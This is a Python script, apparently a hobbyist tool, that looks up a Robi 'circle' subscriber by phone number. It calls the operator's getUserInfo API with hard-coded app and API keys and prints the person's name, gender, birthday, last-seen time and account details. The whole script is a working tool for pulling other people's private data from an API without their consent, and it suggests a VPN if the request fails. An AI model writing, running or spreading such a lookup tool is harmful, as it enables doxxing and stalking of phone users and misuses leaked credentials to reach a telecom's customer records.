

import os
os.system('clear')

import os
os.system("lolcat banner.py")
os.system("python x.py")
print("\n")
os.system("lolcat 01.py")


# Bold High Intensty
biblack="\033[1;90m"      # Black
bired="\033[1;91m"        # Red
bigreen="\033[1;92m"      # Green
biyellow="\033[1;93m"     # Yellow
biblue="\033[1;94m"       # Blue
bipurple="\033[1;95m"     # Purple
bicyan="\033[1;96m"       # Cyan
# Bold High Intensty

import requests, json
from requests.structures import CaseInsensitiveDict
b=str(input(bicyan+"\n[>] Enter ID Number: "))
print(bired+" \n")
                                                                                
import colorama,time,sys
from time import sleep
from colorama import init, Fore, Back,         Style

words = biyellow+"[♦] Circle Details In This Number: \n"  

   
for char in words:
            
            sys.stdout.write(char)
            sys.stdout.flush()
            time.sleep(0.1)
url = "https://circle.robi.com.bd/mylife/appapi/appcall.php?op=getUserInfo&msisdn=88"+b

headers = CaseInsensitiveDict()
headers["x-app-key"] = "000oc0so48owkw4s0wwo4c00g00804w80gwkw8kg"
headers["x-api-key"] = "4e0ab65dcc9f79778e1d583a2aade21a"
headers["User-Agent"] = "gzip"


try:
	resp = requests.get(url, headers=headers)
except:
	print("use vpn")
if resp.json()["rdesc"] == "Not found":
	print(bired+"\n\t [×] User Not found")	
else:	
    try:    
	    
        words = bigreen+"[>] CIRCLE ID  \t : \t"+bicyan+resp.json()["data"]["nickname"]+bigreen+"\n[>] NUMBER\t : \t"+bicyan+resp.json()["data"]["msisdn"]+bigreen+"\n[>] NAME \t : \t"+bicyan+resp.json()["data"]["name"]+bigreen+"\n[>] POINTS\t : \t"+bicyan+resp.json()["data"]["points"]+bigreen+"\n[>] FOLLOWERS\t : \t"+bicyan+resp.json()["data"]["followers"]+bigreen+"\n[>] FOLLOWING \t : \t"+bicyan+resp.json()["data"]["following"]+bigreen+"\n[>] SHOUT\t : \t"+bicyan+resp.json()["data"]["updates"]+bigreen+"\n[>] COMMENTS \t : \t"+bicyan+resp.json()["data"]["comments"]+bigreen+"\n[>] FRIENDS\t : \t"+bicyan+resp.json()["data"]["friends"]+bigreen+"\n[>] POWERED BY \t : \t"+bicyan+"RisHaD SoBuJ"+bigreen+"\n[>] LAST SHOUT\t : \t"+bicyan+resp.json()["data"] ["mlstatus"]+bigreen+"\n[>] GANDER\t : \t"+bicyan+resp.json()["data"]["gender"]+bigreen+"\n[>] BIRTHDAY\t : \t"+bicyan+resp.json()["data"]["birthday"]+bigreen+"\n[>] LASTSEEN \t : \t"+bicyan+resp.json()["data"]["timestamp"]+bigreen+"\n[>] START DATE \t : \t"+bicyan+resp.json()["data"]["start_date"]+bigreen+"\n[>] END DATE \t : \t"+bicyan+resp.json()["data"]["end_date"]+"\n\n" 
        if resp.json()["data"]["type"] == "1":
            	print(bigreen+"[>] APP ACCESS\t :\t"+bicyan+"OFF")
        else:
    
            	print(bigreen+"\n[>] APP ACCESS\t :\t"+bicyan+"ON")   
        if resp.json()["data"]["status_id"] == "0":
            	print(bigreen+"[>] STATUS ID \t :\t"+bicyan+"OFF")
        else:
    
            	print(bigreen+"[>] STATUS ID\t :\t"+bicyan+"ON")   
    	         

   
        for char in words:
            
            sys.stdout.write(char)
            sys.stdout.flush()
            time.sleep(0.01)
        
    except:
        print(bired+" \n\t [!] Something Went Wrong..Try Again")

xn=str(input(bigreen+" \n\tPress"+biyellow+" Enter"+bigreen+" To Exit"))
os.system('clear')